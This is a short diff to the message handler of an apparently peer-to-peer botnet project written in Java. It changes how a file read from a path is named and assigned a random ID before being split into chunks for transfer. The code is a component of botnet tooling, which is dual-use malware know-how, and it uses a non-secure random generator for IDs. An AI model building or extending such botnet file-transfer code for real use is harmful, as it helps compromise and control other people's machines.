@@ -9,8 +9,9 @@ import org.apache.logging.log4j.core.util.IOUtils;
 
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.math.BigInteger;
 import java.util.List;
-import java.util.UUID;
+import java.util.Random;
 
 import static botnet_p2p.MessageOuterClass.Message;
 
@@ -60,10 +61,11 @@ class BotMessageHandler {
             return;
         }
 
-        String fileName = getFileName(path);
+        //String fileName = getFileName(path);
+        String fileName = path;
         FileReader fileReader = new FileReader();
         FileReader.ChunkedFile chunkedFile = fileReader.readFile(path, CHUNK_SIZE);
-        String uuid = UUID.randomUUID().toString();
+        String uuid = new BigInteger(64, new Random()).toString();
 
         List<byte[]> chunks = chunkedFile.chunks;
         for (int i = 0; i < chunks.size(); i++) {
